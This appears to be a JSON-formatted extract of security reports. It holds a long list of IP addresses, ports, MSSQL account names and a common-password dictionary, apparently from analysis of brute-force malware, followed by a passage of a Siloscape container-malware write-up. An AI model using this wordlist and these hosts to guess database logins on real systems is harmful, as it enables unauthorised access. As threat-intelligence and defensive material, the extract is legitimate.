                "94.23.41.130"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "176.9.2.144"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "178.63.48.196"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "78.46.89.102"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "37.59.56.102"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "94.23.212.204"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "188.165.254.85"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "46.105.103.169"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "76.9.50.126"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "37.59.51.212"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "91.121.87.10"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "94.130.206.79"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "188.165.199.78"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "176.31.117.82"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "188.165.214.95"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "94.23.206.130"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "176.9.63.166"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "94.130.164.60"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "78.46.91.171"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "188.165.214.76"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "37.59.44.68"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "94.23.8.105"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "37.59.49.7"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "183.201.229.131"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "117.139.17.68"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "223.167.166.51"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "111.7.68.222"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "3333"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "5555"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "7777"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "45700"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "45560"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "13531"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "2222"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "sa"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "SA"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "su"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "kisadmin"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "SQLDebugger"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "mssql"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Chred1433"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "\\x20"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "administrator"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "sa"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "SA"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "123456"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "1"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "123"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "123123"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "112233"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "1234"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "12345"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "1234567"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "12345678"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "123456789"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "1234567890"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "0123456789"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "a123456"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "admin"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "qaz123"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "1sanjose"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "123.com"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "525464"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "123.qwe"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "process"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "temp"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "1234qwer"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "123asd"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Chred1433"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "admin888"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "1qaz3edc"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "1qaz4rfv"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "3edc4rfv"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "4rfv5tgb"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "5tgb6yhn"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "6yhn7ujm"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "7ujm8ik,"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "aaa123!@#"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "test1234"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "1qaz@wsx#edc"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "admin123456789"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "qazwsx123"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "qaz123wsx"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "admin123"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "password"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "qwe123"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "qweqwe"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "aaa123"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "pass@word1"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Password1234"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "asd@123"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Sa@123"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "!QAZxsw2"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "masterkey"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "sa123!@#"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "abc@123"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "!QAZ1qaz"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "123@abcd"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "111"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "111111"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "11111111"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "11111111111"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "1111"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "888"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "888888"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "8888"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "88888888"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "666"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "6666"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "666666"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "66666666"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "abc123"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "123abc"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "1ab2c3"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "zxcvbn"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "zxcvbnm"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "asdasd"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "asdfghjkl"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "asd123"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "qweasd"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "qweasdzxc"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "QAZWSX"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "123qwe@#"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "admin@123"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "123abc!@#"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "1qaz2ws"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "zaq12wsx"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "P@SSW0rd"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "a123"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "a111111"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "a123456789"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "a1234"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "p@ssw0rd"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "P@ssW0rd"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "P@ssw0rd"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "aa123456"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "1234abcd"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "qwer1234!@#$"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "159357"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "336699"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "1qaz2wsx"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "paSSword"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "password1"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "654321"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "qwerty"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "123456a"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "pa$$word"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "passw0rd"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "PasswOrd"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "qwe.123"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "zxc123!@#"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "root"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "a1b2c3"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "admin123456"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "pass"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "pass123"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "zxc123"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "user"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "11223344"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "asd123456"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "password123"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "121212"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "monkey"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "princess"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "guest"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "123123123"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "qazwsx"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "computer"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "12345a"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "1111222"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "111222"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "123456789a"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "000000"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "1qazXSW@"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "1qaz@WSX"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "123!@#qwe"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "1q2w3e4r5t"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "qwertyuiop"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "q1w2e3"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "123321"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "123qwe"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "1q2w3e4r"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "7777777"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "987654321"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "qwerty1"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "222222"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "1g2w3e4r"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "zag12wsx"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "system"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "555555"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "1q2w3e"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "admin123!@#"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "P@$$w0rd"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "123698745"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "asdfjkl"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "21212121"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "456852"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "a12345678"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "money123"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "1qazxsw2"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "1234rewq"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "12qwaszx"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "22222222"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "zxcvbnm123"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "password11"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "zxcv"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "a1b2c3d4"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "qqqqqq"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "aaa111"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "111aaa"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "369369369"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "369369"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "123454321"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "qw123321"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "asdasdasd"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "111222333"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "asdfghj"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "ypbwkfyjhyhgzj"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "ly1234"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "vice_1433 vice"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "sa@123"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Admin123"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "123qweASD"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Abc123"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Sa123456"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "sa123456"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "sa123"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "target123"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "root123"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "mssql"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "sqlserver"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "server"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "client"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "login"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "test"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "qq123456"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "a123123"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "18n28n24a5"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "test1"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "QAZ123"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Aa123456."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "test123"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "super"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "text"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "vice"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "ifuckyounow"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "zXJl@mwZ"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "!qaz1QAZ"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "!qaz2WSX"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "!qaz3wsx"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "!qaz@WSX"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "qqaazz"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "z123456"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "zaqwsx"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "1qwerty"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "musica"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "!QAZ2wsx"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "abcd1234"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "123456aa"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "1234321"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "123zxc"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "123321a"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "123qaz"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "qwer123"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "qwerty123"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "zxcvbnm,./"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "q1w2Q!W@"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "1qazxcvbnm,./"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "bw99588399"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "huweishen.com"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "huweishen"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "zkeys"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "piress"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "letmein"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Master"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "master"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "model"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "tempdb"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "zjsxidc123"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "0okmnji9"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "msdb"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "superman"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "sql123456"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "baseball"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "welcome"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "sa@qaz"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "sa@qazwsx"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "123qweasd"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "welcometo"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "mypassword"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "caonima"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "147258"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "qwe!@#123"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "123qwe!@#"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "qaz#@!321"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "qwe123123"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "a123.321"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "a321.123"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "a123.123"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "a321.321"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "zaq1xsw2"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "qwert12345"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "PassWord"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "zxcasd"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "qaswed"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "1qaz@2wsx"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "qaz1wsx2"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "qwaszx!@#"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "qazwsx!@#"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "qwe123456"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "1314520"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "147258369"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "idc123456"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "123.654"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "123.456"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "123.456.789"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "123.456.789a"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "123.456a"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "PASSWORD"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "1qw23er4"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "aaaaaa"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "zaq!@wsx"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "aabbcc"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "a12345"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "zxcmnb"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "zxcv1234"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "2wsxdr5"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "2wsx3edc"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "2w3e4r"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "234fd"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "enkj.1qazxdr5"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "123!@#"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "idc123!@#"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "3dgidc@))*"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "ywinidc56#@!"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "aini"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "gjp"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "aini1314520"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "caonimagebi"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "football"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "football123"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "administrator"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "80"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "81"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "88"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "89"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "8080"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "8081"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "8088"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "8090"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "8888"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "8899"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "8989"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "9999"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "7001"
            ]
        }
    ],
    "278628cbb536707c77500a2d724937d99703483f": [
        {
            "type": "caption",
            "content": [
                "In March 2021, I uncovered the first known malware targeting Windows containers, a development that is not surprising given the massive surge in cloud adoption over the past few years.",
                "I named the malware Siloscape (sounds like silo escape) because its primary goal is to escape the container, and in Windows this is implemented mainly by a server silo."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Siloscape is heavily obfuscated malware targeting Kubernetes clusters through Windows containers.",
                "Its main purpose is to open a backdoor into poorly configured Kubernetes clusters in order to run malicious containers."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Compromising an entire cluster is much more severe than compromising an individual container, as a cluster could run multiple cloud applications whereas an individual container usually runs a single cloud application.",
                "For example, the attacker might be able to steal critical information such as usernames and passwords, an organizations confidential and internal files or even entire databases hosted in the cluster.",
                "Such an attack could even be leveraged as a ransomware attack by taking the organization's files hostage.",
                "Even worse, with organizations moving to the cloud, many use Kubernetes clusters as their development and testing environments, and a breach of such an environment can lead to devastating software supply chain attacks."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Siloscape uses the Tor proxy and an .onion domain to anonymously connect to its command and control (C2) server.",
                "I managed to gain access to this server.",
                "We identified 23 active Siloscape victims and discovered that the server was being used to host 313 users in total, implying that Siloscape was a small part of a broader campaign.",
                "I also discovered that this campaign has been taking place for more than a year."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "This report provides background on Windows container vulnerabilities, gives a technical overview of Siloscape and offers recommendations on best practices for securing Windows containers."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Palo Alto Networks customers are protected from this threat with Prisma Clouds Runtime Protection features."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "On July 15, 2020, I released an article about Windows container boundaries and how to break them.",
                "In that article, I presented a technique for escaping from a container and discussed some potential applications that such an escape can have in the hands of an attacker.",
                "The most significant application, and the one I chose to focus on, was an escape from a Windows container node in Kubernetes in order to spread in the cluster."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Microsoft originally didnt consider this issue a vulnerability, based on the reasoning that Windows Server containers are not a security boundary, and therefore each application that is being run inside a container should be treated as if it is executed directly on the host."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "A few weeks after that discussion, I reported the issue to Google because Kubernetes is vulnerable to those issues.",
                "Google contacted Microsoft, and after some back and forth, it was determined by Microsoft that an escape from a Windows container to the host, when executed without administrator permissions inside the container, will in fact be considered a vulnerability."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Following this, I discovered Siloscape, which is malware that actively attempts to exploit Windows Server containers in the wild.",
                "Siloscape is heavily obfuscated malware targeting Kubernetes through Windows containers (using Server Containers and not Hyper-V).",
                "Its main purpose is to open a backdoor into poorly configured Kubernetes clusters in order to run malicious containers such as, but not limited to, cryptojackers."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "The malware is characterized by several behaviors and techniques:"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "This malware can leverage the computing resources in a Kubernetes cluster for cryptojacking and potentially exfiltrate sensitive data from hundreds of applications running in the compromised clusters."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Investigating the C2 server showed that this malware is just a small part of a larger network and that this campaign has been taking place for over a year.",
                "Furthermore, I confirmed that this specific part of the campaign was online with active victims at the time of writing."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Before diving into the technical details of Siloscape, it is important to get a better understanding of its overall behavior and flow."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Unlike other malware targeting containers, which are mostly cryptojacking-focused, Siloscape doesnt actually do anything that will harm the cluster on its own.",
                "Instead, it focuses on being undetected and untraceable and opens a backdoor to the cluster."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Siloscape is heavily obfuscated.",
                "There are almost no readable strings in the entire binary.",
                "While the obfuscation logic itself isnt complicated, it made reversing this binary frustrating."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Even simple API calls were obfuscated, and instead of just calling the functions, Siloscape made the effort to use the Native API (NTAPI) version of the same function."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "For example, instead of calling CreateFile, Siloscape calls NtCreateFile.",
                "Instead of calling NtCreateFile directly, Siloscape calls it dynamically, meaning it searches for the function name in ntdll.dll at runtime and jumps to its address.",
                "Not only that, but it also obfuscates the function and module names and deobfuscates them only at runtime.",
                "The end result is malware that is very difficult to detect with static analysis tools and frustrating to reverse engineer."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Siloscape uses a pair of keys to decrypt the C2 servers password.",
                "One of the most important features of its obfuscation is that one key is hardcoded into the binary, while the other is supplied as a command line argument.",
                "I searched for its hash in multiple engines, such as AutoFocus and VirusTotal, and couldnt find any results.",
